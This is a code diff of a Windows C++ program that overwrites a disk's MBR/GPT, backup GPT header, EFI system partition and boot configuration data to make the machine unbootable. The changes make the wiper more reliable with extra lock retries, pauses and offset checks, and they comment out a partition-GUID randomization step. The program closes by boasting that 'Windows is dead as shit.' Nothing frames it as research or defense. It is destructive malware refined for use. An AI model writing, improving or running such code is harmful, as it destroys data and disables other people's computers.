@@ -30,8 +30,8 @@ bool OverwriteSector(HANDLE hDisk, LARGE_INTEGER offset, BYTE* buffer, DWORD siz
     return false;
 }
 
-bool LockVolume(HANDLE hVolume, DWORD& errorCode) {
-    for (int attempt = 0; attempt < 3; ++attempt) {
+bool LockVolume(HANDLE hVolume, DWORD& errorCode, int retries = 3) {
+    for (int attempt = 0; attempt < retries; ++attempt) {
         DWORD bytesReturned;
         if (DeviceIoControl(hVolume, FSCTL_LOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr)) {
             errorCode = 0;
@@ -39,7 +39,7 @@ bool LockVolume(HANDLE hVolume, DWORD& errorCode) {
         }
         errorCode = GetLastError();
         std::cerr << "Warning: Failed to lock volume (Code: " << errorCode << ", attempt " << attempt + 1 << ").\n";
-        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
+        std::this_thread::sleep_for(std::chrono::milliseconds(2000));
     }
     return false;
 }
@@ -184,6 +184,7 @@ bool StopService(const wchar_t* serviceName) {
     return false;
 }
 
+/* Commented out for optional use
 bool RandomizePartitionGUIDs(HANDLE hDisk, DRIVE_LAYOUT_INFORMATION_EX* layout, DWORD partitionCount, DWORD& errorCode) {
     std::random_device rd;
     std::mt19937 gen(rd());
@@ -208,6 +209,7 @@ bool RandomizePartitionGUIDs(HANDLE hDisk, DRIVE_LAYOUT_INFORMATION_EX* layout, 
     }
     return false;
 }
+*/
 
 int main() {
     SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
@@ -272,7 +274,7 @@ int main() {
         {"GPT Backup", true, 0, ""},
         {"ESP", true, 0, ""},
         {"BCD", true, 0, ""},
-        {"Partition GUIDs", true, 0, ""}
+        {"Partition GUIDs", true, 0, "Skipped (commented out)"}
     };
 
     bool isGPT = false;
@@ -286,13 +288,10 @@ int main() {
         isGPT = true;
         status[2].success = false;
         status[3].success = false;
-        status[4].success = false;
         status[2].errorCode = GetLastError();
         status[3].errorCode = status[2].errorCode;
-        status[4].errorCode = status[2].errorCode;
         status[2].errorMsg = "Partition layout failure";
         status[3].errorMsg = status[2].errorMsg;
-        status[4].errorMsg = status[2].errorMsg;
     }
 
     // Nuke MBR/GPT
@@ -312,6 +311,7 @@ int main() {
                 status[0].errorCode = errorCode;
                 status[0].errorMsg = errorCode == 5 ? "Access Denied" : "Unknown error";
             }
+            std::this_thread::sleep_for(std::chrono::milliseconds(500));
         }
         DeviceIoControl(hDisk, FSCTL_UNLOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr);
         UpdateDiskProperties(hDisk, errorCode);
@@ -325,30 +325,37 @@ int main() {
     if (isGPT) {
         LARGE_INTEGER gptBackupOffset;
         gptBackupOffset.QuadPart = diskGeometry.DiskSize.QuadPart - SECTOR_SIZE * GPT_BACKUP_SECTORS;
-        if (gptBackupOffset.QuadPart < 0) WriteError("Invalid GPT backup offset", 0);
-        if (LockVolume(hDisk, errorCode)) {
-            for (int pass = 0; pass < 4; ++pass) {
-                if (pass == 0 || pass == 3) {
-                    for (int i = 0; i < SECTOR_SIZE * GPT_BACKUP_SECTORS; ++i) gptBuffer[i] = dis(gen);
-                } else if (pass == 1) {
-                    ZeroMemory(gptBuffer, SECTOR_SIZE * GPT_BACKUP_SECTORS);
-                } else {
-                    memset(gptBuffer, 0xFF, SECTOR_SIZE * GPT_BACKUP_SECTORS);
-                }
-                if (!OverwriteSector(hDisk, gptBackupOffset, gptBuffer, SECTOR_SIZE * GPT_BACKUP_SECTORS, 
-                                    pass == 0 ? "GPT backup random pass 1" : pass == 1 ? "GPT backup zero pass" : 
-                                    pass == 2 ? "GPT backup ones pass" : "GPT backup random pass 2", errorCode)) {
-                    status[1].success = false;
-                    status[1].errorCode = errorCode;
-                    status[1].errorMsg = errorCode == 5 ? "Access Denied" : "Unknown error";
-                }
-            }
-            DeviceIoControl(hDisk, FSCTL_UNLOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr);
-            UpdateDiskProperties(hDisk, errorCode);
-        } else {
+        if (gptBackupOffset.QuadPart < 0 || gptBackupOffset.QuadPart + SECTOR_SIZE * GPT_BACKUP_SECTORS > diskGeometry.DiskSize.QuadPart) {
+            std::cerr << "Warning: Invalid GPT backup offset, skipping GPT Backup nuke.\n";
             status[1].success = false;
-            status[1].errorCode = errorCode;
-            status[1].errorMsg = errorCode == 5 ? "Access Denied" : "Unknown error";
+            status[1].errorCode = 0;
+            status[1].errorMsg = "Invalid offset";
+        } else {
+            if (LockVolume(hDisk, errorCode, 5)) {
+                for (int pass = 0; pass < 4; ++pass) {
+                    if (pass == 0 || pass == 3) {
+                        for (int i = 0; i < SECTOR_SIZE * GPT_BACKUP_SECTORS; ++i) gptBuffer[i] = dis(gen);
+                    } else if (pass == 1) {
+                        ZeroMemory(gptBuffer, SECTOR_SIZE * GPT_BACKUP_SECTORS);
+                    } else {
+                        memset(gptBuffer, 0xFF, SECTOR_SIZE * GPT_BACKUP_SECTORS);
+                    }
+                    if (!OverwriteSector(hDisk, gptBackupOffset, gptBuffer, SECTOR_SIZE * GPT_BACKUP_SECTORS, 
+                                        pass == 0 ? "GPT backup random pass 1" : pass == 1 ? "GPT backup zero pass" : 
+                                        pass == 2 ? "GPT backup ones pass" : "GPT backup random pass 2", errorCode)) {
+                        status[1].success = false;
+                        status[1].errorCode = errorCode;
+                        status[1].errorMsg = errorCode == 5 ? "Access Denied" : "Unknown error";
+                    }
+                    std::this_thread::sleep_for(std::chrono::milliseconds(500));
+                }
+                DeviceIoControl(hDisk, FSCTL_UNLOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr);
+                UpdateDiskProperties(hDisk, errorCode);
+            } else {
+                status[1].success = false;
+                status[1].errorCode = errorCode;
+                status[1].errorMsg = errorCode == 5 ? "Access Denied" : "Unknown error";
+            }
         }
     }
 
@@ -390,6 +397,7 @@ int main() {
                             status[2].errorCode = errorCode;
                             status[2].errorMsg = errorCode == 5 ? "Access Denied" : "Unknown error";
                         }
+                        std::this_thread::sleep_for(std::chrono::milliseconds(500));
                     }
                     LARGE_INTEGER bcdOffset;
                     bcdOffset.QuadPart = espOffset.QuadPart + 10LL * SECTOR_SIZE;
@@ -411,6 +419,7 @@ int main() {
                                 status[3].errorCode = errorCode;
                                 status[3].errorMsg = errorCode == 5 ? "Access Denied" : "Unknown error";
                             }
+                            std::this_thread::sleep_for(std::chrono::milliseconds(500));
                         }
                     } else {
                         std::cerr << "Warning: BCD offset invalid, skipping BCD nuke.\n";
@@ -463,6 +472,7 @@ int main() {
                                             status[2].errorCode = errorCode;
                                             status[2].errorMsg = errorCode == 5 ? "Access Denied" : "Unknown error";
                                         }
+                                        std::this_thread::sleep_for(std::chrono::milliseconds(500));
                                     }
                                     LARGE_INTEGER bcdOffset;
                                     bcdOffset.QuadPart = 10LL * SECTOR_SIZE;
@@ -484,6 +494,7 @@ int main() {
                                                 status[3].errorCode = errorCode;
                                                 status[3].errorMsg = errorCode == 5 ? "Access Denied" : "Unknown error";
                                             }
+                                            std::this_thread::sleep_for(std::chrono::milliseconds(500));
                                         }
                                     } else {
                                         std::cerr << "Warning: BCD offset invalid, skipping BCD nuke.\n";
@@ -527,6 +538,7 @@ int main() {
         }
     }
 
+    /* Commented out for optional use
     // Randomize Partition GUIDs (at the end)
     if (isGPT && status[4].success) {
         if (LockVolume(hDisk, errorCode)) {
@@ -545,6 +557,7 @@ int main() {
             status[4].errorMsg = errorCode == 5 ? "Access Denied" : "Unknown error";
         }
     }
+    */
 
     delete[] buffer;
     delete[] gptBuffer;
@@ -554,14 +567,14 @@ int main() {
     bool allSucceeded = true;
     for (const auto& s : status) {
         std::cout << s.name << ": " << (s.success ? "Succeeded" : "Failed");
-        if (!s.success) {
+        if (!s.success || s.name == "Partition GUIDs") {
             std::cout << " (" << s.errorMsg << ", Code: " << s.errorCode << ")";
-            allSucceeded = false;
+            if (s.name != "Partition GUIDs") allSucceeded = false;
         }
         std::cout << "\n";
     }
     std::cout << "Overall: " << (allSucceeded ? "Fully Succeeded" : "Partial Success") << "\n";
-    std::cout << "Boot sector, ESP, BCD, and partition GUIDs fucking obliterated. No EFI traces, Windows is dead as shit. 😈\n";
+    std::cout << "Boot sector, ESP, BCD fucking obliterated. No EFI traces, Windows is dead as shit. 😈\n";
 
     return 0;
 }
